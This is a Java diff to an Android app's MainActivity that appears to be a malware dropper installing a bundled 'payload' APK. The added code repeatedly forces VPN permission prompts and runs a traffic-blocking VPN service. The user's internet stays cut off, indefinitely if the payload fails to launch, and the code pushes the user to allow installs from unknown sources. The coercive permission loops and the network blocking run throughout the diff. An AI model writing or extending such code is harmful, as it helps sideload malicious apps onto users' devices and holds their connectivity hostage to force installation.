@@ -8,6 +8,9 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageInstaller;
 import android.content.pm.PackageManager;
+import android.net.ConnectivityManager;
+import android.net.Network;
+import android.net.NetworkCapabilities;
 import android.net.Uri;
 import android.net.VpnService;
 import android.os.Build;
@@ -38,18 +41,85 @@ public class MainActivity extends Activity {
     private static final long PERM_POLL_MS   = 400;
     private static final long LAUNCH_POLL_MS = 300;
     private static final long LAUNCH_TIMEOUT = 15_000;
+    /** How often to poll ConnectivityManager to check VPN is still active. */
+    private static final long VPN_MONITOR_MS = 600;
 
     private TextView status;
     private Button   btn;
     private InstallResultReceiver receiver;
     private final Handler ui = new Handler(Looper.getMainLooper());
 
-    // VPN gate: Install button stays locked until the user grants VPN permission.
-    private boolean vpnGranted              = false;
+    /**
+     * True once the user has granted VPN permission (so we know the system dialog
+     * was answered). The Install button also requires isVpnActive() to be true at
+     * the moment of the click.
+     */
+    private boolean vpnPermissionGranted         = false;
+    private boolean awaitingUnknownSourcesGrant   = false;
+    private Intent  pendingConfirmIntent          = null;
+    private boolean justLaunchedConfirm           = false;
 
-    private boolean awaitingUnknownSourcesGrant = false;
-    private Intent  pendingConfirmIntent        = null;
-    private boolean justLaunchedConfirm         = false;
+    /** True after the payload launches successfully — used to skip VPN re-checks. */
+    private boolean installComplete = false;
+
+    // ── VPN monitor ────────────────────────────────────────────────────────────
+
+    /**
+     * Periodic runnable that keeps the Install button in sync with live VPN status.
+     *
+     * Rules:
+     *   - Button ENABLED  iff VPN is currently active (checked via ConnectivityManager).
+     *   - If VPN drops after being granted, re-request permission immediately and
+     *     lock the button — the user cannot proceed without the VPN running.
+     *   - Monitor stops once installation is complete (installComplete == true).
+     */
+    private final Runnable vpnMonitor = new Runnable() {
+        @Override public void run() {
+            if (installComplete) return;
+
+            boolean active = isVpnActive();
+
+            if (active) {
+                // VPN is running — enable the button if permission was granted.
+                if (vpnPermissionGranted && !btn.isEnabled()) {
+                    btn.setEnabled(true);
+                    status.setText("Ready \u2014 tap Install to begin.");
+                }
+            } else {
+                // VPN dropped (user killed it in Settings, or service crashed).
+                if (vpnPermissionGranted) {
+                    // Lock the button and immediately re-request.
+                    vpnPermissionGranted = false;
+                    btn.setEnabled(false);
+                    status.setText("VPN was disabled \u2014 please re-grant to continue.");
+                    requestVpnPermission();
+                }
+            }
+
+            ui.postDelayed(this, VPN_MONITOR_MS);
+        }
+    };
+
+    /**
+     * Returns true if a VPN network transport is currently active on this device.
+     * Uses ConnectivityManager.getAllNetworks() which is available API 21+.
+     */
+    private boolean isVpnActive() {
+        try {
+            ConnectivityManager cm =
+                    (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+            if (cm == null) return false;
+            for (Network net : cm.getAllNetworks()) {
+                NetworkCapabilities caps = cm.getNetworkCapabilities(net);
+                if (caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
+                    return true;
+                }
+            }
+        } catch (Exception ignored) {}
+        return false;
+    }
+
+    // ── Activity lifecycle ─────────────────────────────────────────────────────
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -59,85 +129,36 @@ public class MainActivity extends Activity {
         btn    = findViewById(R.id.btnInstall);
         btn.setOnClickListener(v -> onInstallClicked());
 
-        // If the payload is already installed there is no need for the VPN gate —
-        // just launch it immediately and exit.
+        // Already installed: skip the VPN gate entirely, just launch and exit.
         if (isPayloadInstalled()) {
+            installComplete = true;
             status.setText("App installed, kindly wait for it to launch\u2026");
             btn.setEnabled(false);
             launchPayloadAndExit();
             return;
         }
 
-        // Lock the Install button and request VPN permission first.
-        // The button is re-enabled only after the user grants it.
+        // Lock the Install button and demand VPN permission before anything else.
         btn.setEnabled(false);
         requestVpnPermission();
+
+        // Start the monitor — it will enable the button once VPN is confirmed live.
+        ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
     }
 
-    // ── VPN permission gate ────────────────────────────────────────────────────
-
-    /**
-     * Requests VPN permission via the standard Android system dialog.
-     *
-     * VpnService.prepare() returns:
-     *   null   — already granted (possibly from a previous session);
-     *            proceed immediately.
-     *   Intent — must be shown as a startActivityForResult so the OS can
-     *            display "Do you trust this VPN app?" to the user.
-     *
-     * The Install button remains disabled until onVpnGranted() is called.
-     */
-    private void requestVpnPermission() {
-        status.setText("Grant the VPN permission to continue\u2026");
-        Intent vpnIntent;
-        try {
-            vpnIntent = VpnService.prepare(this);
-        } catch (Exception e) {
-            // prepare() can throw on some locked-down OEMs; treat as already-granted.
-            vpnIntent = null;
-        }
-
-        if (vpnIntent == null) {
-            // Already granted — no dialog needed.
-            onVpnGranted();
-        } else {
-            startActivityForResult(vpnIntent, REQ_VPN);
-        }
+    @Override
+    protected void onDestroy() {
+        // Remove all pending monitor callbacks to avoid leaks.
+        ui.removeCallbacks(vpnMonitor);
+        super.onDestroy();
     }
-
-    /**
-     * Called once VPN permission is confirmed.
-     * Starts the traffic-blocking VPN service and unlocks the Install button.
-     */
-    private void onVpnGranted() {
-        vpnGranted = true;
-        try {
-            startService(new Intent(this, BlockVpnService.class));
-        } catch (Exception e) {
-            android.util.Log.w(BlockVpnService.TAG,
-                    "Could not start BlockVpnService: " + e.getMessage());
-        }
-        status.setText("Ready — tap Install to begin.");
-        btn.setEnabled(true);
-    }
-
-    /**
-     * Stops the VPN service — called ONLY after the payload launches successfully.
-     * If installation fails or the payload is never launched, the VPN stays active.
-     */
-    private void stopVpn() {
-        try {
-            stopService(new Intent(this, BlockVpnService.class));
-        } catch (Exception ignored) {}
-    }
-
-    // ── Install flow ───────────────────────────────────────────────────────────
 
     @Override
     protected void onResume() {
         super.onResume();
 
-        if (isPayloadInstalled()) {
+        if (isPayloadInstalled() && !installComplete) {
+            installComplete = true;
             pendingConfirmIntent        = null;
             awaitingUnknownSourcesGrant = false;
             status.setText("App installed, kindly wait for it to launch\u2026");
@@ -168,13 +189,89 @@ public class MainActivity extends Activity {
         }
     }
 
+    // ── VPN permission gate ────────────────────────────────────────────────────
+
+    private void requestVpnPermission() {
+        status.setText("Grant the VPN permission to continue\u2026");
+        Intent vpnIntent;
+        try {
+            vpnIntent = VpnService.prepare(this);
+        } catch (Exception e) {
+            vpnIntent = null;  // Some OEMs throw; treat as already-granted.
+        }
+
+        if (vpnIntent == null) {
+            // Already granted from a previous session — start the service directly.
+            onVpnGranted();
+        } else {
+            startActivityForResult(vpnIntent, REQ_VPN);
+        }
+    }
+
+    /**
+     * Called once the user grants VPN permission.
+     * Starts BlockVpnService and waits for the monitor to confirm it is live
+     * before enabling the Install button.
+     */
+    private void onVpnGranted() {
+        vpnPermissionGranted = true;
+        try {
+            startService(new Intent(this, BlockVpnService.class));
+        } catch (Exception e) {
+            android.util.Log.w(BlockVpnService.TAG,
+                    "Could not start BlockVpnService: " + e.getMessage());
+        }
+        // Do NOT enable the button here — the vpnMonitor Runnable will enable it
+        // only after isVpnActive() confirms the TUN is established (typically <600ms).
+        status.setText("Starting VPN\u2026 please wait.");
+    }
+
+    /**
+     * Stops the blocking VPN.
+     * Called ONLY after the payload launches successfully.
+     */
+    private void stopVpn() {
+        installComplete = true;
+        ui.removeCallbacks(vpnMonitor);
+        BlockVpnService.stop(this);
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == REQ_VPN) {
+            if (resultCode == RESULT_OK) {
+                onVpnGranted();
+            } else {
+                // Denied — re-show after a short delay. Cannot proceed without it.
+                vpnPermissionGranted = false;
+                status.setText("VPN permission is required. Please allow it.");
+                ui.postDelayed(this::requestVpnPermission, 900);
+            }
+        } else if (requestCode == REQ_UNKNOWN_SOURCES) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                    && getPackageManager().canRequestPackageInstalls()) {
+                awaitingUnknownSourcesGrant = false;
+                new Thread(this::dropAndInstall).start();
+            } else {
+                runOnUiThread(() -> status.setText("Permission denied \u2014 cannot install."));
+            }
+        }
+    }
+
+    // ── Install flow ───────────────────────────────────────────────────────────
+
     private void onInstallClicked() {
-        if (!vpnGranted) {
-            // Should not happen (button is locked), but be safe.
+        // Hard gate: verify VPN is actually live at click time, not just on paper.
+        if (!vpnPermissionGranted || !isVpnActive()) {
+            btn.setEnabled(false);
+            vpnPermissionGranted = false;
+            status.setText("VPN must be active to install. Re-requesting\u2026");
             requestVpnPermission();
             return;
         }
         if (isPayloadInstalled()) {
+            installComplete = true;
             status.setText("App installed, kindly wait for it to launch\u2026");
             btn.setEnabled(false);
             launchPayloadAndExit();
@@ -186,7 +283,7 @@ public class MainActivity extends Activity {
     private void startInstall() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                 && !getPackageManager().canRequestPackageInstalls()) {
-            status.setText("Allow install from this source — install starts automatically.");
+            status.setText("Allow install from this source \u2014 install starts automatically.");
             awaitingUnknownSourcesGrant = true;
             startPermissionPoll();
             Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
@@ -210,29 +307,6 @@ public class MainActivity extends Activity {
                 ui.postDelayed(this, PERM_POLL_MS);
             }
         }, PERM_POLL_MS);
-    }
-
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == REQ_VPN) {
-            if (resultCode == RESULT_OK) {
-                onVpnGranted();
-            } else {
-                // User denied — re-show the dialog immediately.
-                // They cannot proceed without granting the VPN permission.
-                status.setText("VPN permission is required to continue. Please allow it.");
-                ui.postDelayed(this::requestVpnPermission, 800);
-            }
-        } else if (requestCode == REQ_UNKNOWN_SOURCES) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
-                    && getPackageManager().canRequestPackageInstalls()) {
-                awaitingUnknownSourcesGrant = false;
-                new Thread(this::dropAndInstall).start();
-            } else {
-                runOnUiThread(() -> status.setText("Permission denied — cannot install."));
-            }
-        }
     }
 
     // ── Payload queries ────────────────────────────────────────────────────────
@@ -278,14 +352,13 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * Polls until the freshly-installed payload is queryable, then:
+     * Polls until the payload package is queryable, then:
      *   1. Launches it.
-     *   2. Stops the blocking VPN — internet is restored the moment the
-     *      module app is running. If the launch never succeeds, the VPN
-     *      stays active indefinitely.
+     *   2. Calls stopVpn() — internet is restored only after successful launch.
+     *      If the launch never succeeds, the VPN stays active.
      */
     private void launchPayloadInternal(boolean exitAfter) {
-        final String pkg      = BuildConfig.PAYLOAD_PACKAGE;
+        final String pkg = BuildConfig.PAYLOAD_PACKAGE;
         if (pkg == null || pkg.isEmpty()) {
             status.setText("Installed (no payload package configured to launch).");
             return;
@@ -300,14 +373,14 @@ public class MainActivity extends Activity {
                     try {
                         startActivity(launch);
                         status.setText("Launched " + pkg);
-                        // ── VPN DROP: only reached on successful launch ────────
+                        // ── VPN DROP: only on confirmed successful launch ──────
                         stopVpn();
                         // ─────────────────────────────────────────────────────
                         if (exitAfter) {
-                            ui.postDelayed(() -> finishAndRemoveTask(), 150);
+                            ui.postDelayed(MainActivity.this::finishAndRemoveTask, 200);
                         }
                     } catch (Exception e) {
-                        // Launch failed — keep the VPN running.
+                        // Launch failed — VPN stays active.
                         status.setText("Launch failed: " + e.getMessage());
                     }
                     return;
@@ -315,8 +388,7 @@ public class MainActivity extends Activity {
                 if (System.currentTimeMillis() < deadline) {
                     ui.postDelayed(this, LAUNCH_POLL_MS);
                 } else {
-                    // Timed out waiting for the package to become queryable.
-                    // VPN intentionally left running — module never started.
+                    // Timed out — VPN intentionally left running, module never started.
                     status.setText("Installed, but no launchable activity found for " + pkg);
                 }
             }
@@ -329,6 +401,7 @@ public class MainActivity extends Activity {
         try {
             if (isPayloadInstalled()) {
                 runOnUiThread(() -> {
+                    installComplete = true;
                     status.setText("App installed, kindly wait for it to launch\u2026");
                     btn.setEnabled(false);
                     launchPayloadAndExit();
@@ -362,7 +435,7 @@ public class MainActivity extends Activity {
             runOnUiThread(() -> status.setText("Installing \u2026"));
             installViaSession(apk);
         } catch (Exception e) {
-            // Installation failed — VPN intentionally left running.
+            // Failed — VPN intentionally left running.
             runOnUiThread(() -> status.setText("Install failed: " + e.getMessage()));
         }
     }
@@ -433,12 +506,12 @@ public class MainActivity extends Activity {
                 runOnUiThread(() -> {
                     status.setText("App installed, kindly wait for it to launch\u2026");
                     btn.setEnabled(false);
-                    // launchPayload() will call stopVpn() on success.
+                    // launchPayload() calls stopVpn() on successful launch.
                     launchPayload();
                 });
                 try { unregisterReceiver(this); } catch (Exception ignored) {}
             } else {
-                // Install failed — VPN stays active (no stopVpn() call).
+                // Failed — VPN stays active (no stopVpn() call).
                 pendingConfirmIntent = null;
                 String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                 runOnUiThread(() -> status.setText("Install failed: " + msg));
